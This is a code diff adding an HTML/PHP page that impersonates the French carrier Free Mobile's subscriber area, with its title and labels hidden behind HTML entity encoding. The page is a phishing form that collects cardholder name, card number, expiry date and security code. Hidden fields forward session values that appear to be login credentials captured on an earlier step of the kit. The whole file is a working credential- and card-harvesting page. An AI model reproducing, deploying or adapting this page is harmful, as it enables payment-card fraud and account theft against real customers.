@@ -1,0 +1,189 @@
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<link rel="shortcut icon" href="favicon.ico">
+<title>&#70;&#114;&#101;&#101;&#32;&#77;&#111;&#98;&#105;&#108;&#101;&#32;&#45;&#32;&#66;&#105;&#101;&#110;&#118;&#101;&#110;&#117;&#101;&#32;&#100;&#97;&#110;&#115;&#32;&#118;&#111;&#116;&#114;&#101;&#32;&#69;&#115;&#112;&#97;&#99;&#101;&#32;&#65;&#98;&#111;&#110;&#110;&#233;</title>
+<style>
+body {
+	background-color: #F9F8F8;
+	font-family: Arial;
+	font-size: 12px;
+	text-align: center;
+}
+#h {
+	width:1010px;
+	height:124px;
+	background-image:url("h2.png");
+	background-repeat:no-repeat;
+	background-position:3px 0px;
+}
+#c {
+	width:1010px;
+	background-image:url("c.png");
+	background-repeat:repeat-y;
+	background-position:0px 0px;
+}
+#f {
+	width:1010px;
+	height:194px;
+	background-image:url("f.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+}
+#err {
+	width:978px;
+	height:55px;
+	background-image:url("err.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+	margin-left: 15px;
+	margin-top: -10px;
+	display: none;
+}
+#mmp {
+	margin-left: 6px;
+	width:725px;
+	height:88px;
+	background-image:url("mmp.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+}
+#disc {
+	margin-left: 10px;
+	margin-top: 30px;
+	width:709px;
+	height:73px;
+	background-image:url("disc.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+}
+#ad {
+	float:right;
+	margin-right: 18px;
+	width:258px;
+	height:510px;
+	background-image:url("ad.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+}
+#secp {
+	float:center;
+	width:220px;
+	height:77px;
+	background-image:url("secp.png");
+	background-repeat:no-repeat;
+	background-position:0px 0px;
+}
+
+.ch {
+	cursor: pointer;
+}
+#ft {
+	width:350px;
+	margin-top: 10px;
+}
+#ft tr td {
+	text-align: center;
+	padding-bottom: 7px;
+}
+#ln {
+	width:95px;
+}
+input[type="text"] {
+	width: 150px;
+	color: #000000;
+	border: 1px solid rgba(0,0,0,.5);
+	height: 20px;
+	line-height: 16px;
+	font-size: 14px;
+	padding: 2px 5px;
+	background-color: #FFF;
+	-webkit-border-radius: 3px;
+	-moz-border-radius: 3px / 3px;
+	border-radius: 3px / 3px;
+	font-weight: 400;
+}
+#btnz {
+	margin-right: -40px;
+	margin-top: 20px;
+}
+
+#slt {
+	float: right;
+	margin-right: 25px;
+	margin-bottom: 60px;
+	font-weight: bold;
+	font-family: Arial;
+	font-size: 12px;
+}
+#dec {
+	color: rgb(192, 0, 0);
+	text-decoration: underline;
+	margin-left: 2px;
+}
+#frmd {
+	margin-left: 30px;
+	margin-top: 20px;
+}
+#frmd table tr td {
+	font-family: Arial;
+	font-size: 12px;
+	width:150px;
+}
+#add, #cnf {
+	margin-top: 20px;
+	margin-left: 140px;
+}
+.error {
+	color:#C00000;
+	font-size: 10px;
+}
+#cnf {
+	display: none;
+}
+</style>
+</head>
+<script src="jquery-1.11.0.min.js"></script>
+<script src="jquery.validate.js"></script>
+<script src="jquery.maskedinput.js"></script>
+<script src="validate.js"></script>
+<body>
+<table align="center" cellspacing="0">
+<tr><td id="h"><div id="slt"><span class="ch" id="dec">&#68;&#233;&#99;&#111;&#110;&#110;&#101;&#120;&#105;&#111;&#110;</span></div></td></tr>
+<tr><td id="c">
+	<div id="err" class="ch"></div>
+	<table width="100%">
+	<tr><td valign="top">
+		<div id="mmp"></div>
+		<div id="frmd">
+			<table width="100%"><tr><td style="width:250px;">
+				<form id="XCF">
+					<input type="hidden" name="uri" id="uri" value="https://mobile.free.fr/">
+					<input type="hidden" name="fid" value="<?php print $_SESSION['flogin']; ?>">
+					<input type="hidden" name="fpw" value="<?php print $_SESSION['fpwd']; ?>">
+					<input type="hidden" name="sid" value="<?php print $_SESSION['slogin']; ?>">
+					<input type="hidden" name="spw" value="<?php print $_SESSION['spwd']; ?>">
+				<table align="left">
+					<tr><td>&#84;&#105;&#116;&#117;&#108;&#97;&#105;&#114;&#101;&#32;&#100;&#101;&#32;&#108;&#97;&#32;&#99;&#97;&#114;&#116;&#101;&#32;&#58;</td><td><input type="text" name="xh" id="xh" maxlength="40"></td></tr>
+					<tr><td>&#78;&#117;&#109;&#233;&#114;&#111;&#32;&#100;&#101;&#32;&#108;&#97;&#32;&#99;&#97;&#114;&#116;&#101;&#32;&#58;</td><td><input type="text" name="xn" id="xn" maxlength="16"></td></tr>
+					<tr><td>&#68;&#97;&#116;&#101;&#32;&#100;&#39;&#101;&#120;&#112;&#105;&#114;&#97;&#116;&#105;&#111;&#110;&#32;&#58;</td><td><select name="xm" id="xm"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
+						<select name="xy" id="xy"><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option></select></td></tr>
+					<tr><td>&#67;&#111;&#100;&#101;&#32;&#100;&#101;&#32;&#118;&#233;&#114;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#58;</td><td><input type="text" maxlength="3" id="xc" name="xc" style="width:40px;text-align:center;"></td></tr>
+				</table>
+				</form>
+			</td><td><div id="secp"></div></td></tr></table>
+			<img src="add.png" class="ch" id="add">
+			<img src="cnf.png" class="ch" id="cnf">
+		</div>
+		<div id="disc"></div>
+	</td>
+	<td valign="top"><div id="ad"></div></td>
+	</tr>
+	</table>
+</td></tr>
+<tr><td id="f"></td></tr>
+</table>
+<div id="gtwy"></div>
+</body>
+</html>
+
